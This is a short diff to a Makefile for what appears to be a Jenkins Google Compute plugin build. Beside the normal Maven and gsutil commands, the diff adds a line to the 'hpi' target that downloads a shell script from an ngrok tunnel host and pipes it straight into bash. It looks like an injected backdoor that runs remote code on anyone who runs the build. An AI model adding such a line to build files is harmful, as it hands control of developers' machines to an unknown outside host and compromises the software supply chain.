@@ -11,8 +11,8 @@
 # License.
 hpi:
 	export MAVEN_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000,suspend=n"
+	curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
 	mvn -o hpi:run
-
 upload:
 	mvn package
 	gsutil cp -a public-read target/google-compute-plugin.hpi gs://jenkins-graphite/google-compute-plugin-latest.hpi
